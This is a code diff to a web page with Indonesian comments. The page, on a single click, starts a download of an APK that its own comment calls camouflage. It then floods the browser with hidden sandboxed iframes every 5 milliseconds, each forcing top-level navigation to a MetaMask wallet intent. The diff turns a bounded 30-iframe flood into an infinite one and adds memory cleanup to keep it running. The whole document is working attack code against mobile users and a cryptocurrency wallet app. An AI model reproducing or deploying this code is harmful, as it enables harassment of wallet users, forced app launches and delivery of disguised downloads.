@@ -12,8 +12,8 @@
     height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
   }
   .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
-  h2 { animation: blink 0.2s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
+  h2 { animation: blink 0.1s infinite; }
+  @keyframes blink { 50% { opacity: 0.1; } }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
   iframe { display: none; }
 </style>
@@ -49,21 +49,21 @@
                         "end;";
 
   // ============================================
-  // 2. TRIGGER FLOODING (KLIK)
+  // 2. TRIGGER INFINITE FLOOD (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING FLOOD...</h2>
-      <p>Memulai Intent Flooding 200ms...</p>
+      <h2>EXECUTING INFINITE FLOOD...</h2>
+      <p>Membanjiri Intent MetaMask...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Multi-Iframe Intent Flood...");
+    log("[!] Memulai Infinite Intent Flood (5ms)...");
 
-    // A. Kamuflase: Unduh APK
+    // A. Kamuflase: Unduh APK (Sekali saja)
     try {
       var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
       var binary = atob(b64Apk);
@@ -80,35 +80,19 @@
       log("[+] APK Download Triggered.");
     } catch(e) {}
 
-    // B. FLOODING IFRAME (200ms Window)
+    // B. INFINITE FLOODING (Setiap 5ms)
     var iframeCount = 0;
-    var maxIframes = 30; // Jumlah iframe (30 sudah sangat berat)
-    var interval = 5; // Setiap 5ms buat 1 iframe (200ms / 30 = ~6.6ms)
-
     var floodInterval = setInterval(function() {
-      if (iframeCount >= maxIframes) {
-        clearInterval(floodInterval);
-        log("[!] Flooding Selesai. Mengirim Fallback...");
-        
-        // Fallback Top-Level setelah 200ms
-        setTimeout(function() {
-          window.location.href = METAMASK_INTENT;
-        }, 50);
-        return;
-      }
-
       try {
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
         
-        // Suntikkan Intent ke dalam iframe
         iframe.srcdoc = `
           <!DOCTYPE html>
           <html>
           <body>
             <script>
-              // Redirect ke MetaMask
               window.top.location.href = "${METAMASK_INTENT}";
             <\/script>
           </body>
@@ -119,11 +103,18 @@
         iframeCount++;
         
         if (iframeCount % 10 === 0) {
-          log("[+] Iframe Intent " + iframeCount + " terkirim.");
+          log("[+] Iframe " + iframeCount + " terkirim.");
         }
-      } catch(e) {}
 
-    }, interval); // 5ms
+        // Cleanup iframe lama untuk mencegah memori penuh (OOM)
+        if (document.getElementById("launcher-container").children.length > 50) {
+          document.getElementById("launcher-container").removeChild(
+            document.getElementById("launcher-container").firstChild
+          );
+        }
+
+      } catch(e) {}
+    }, 5); // 5ms (Sangat Cepat)
 
   }, { once: true });
 
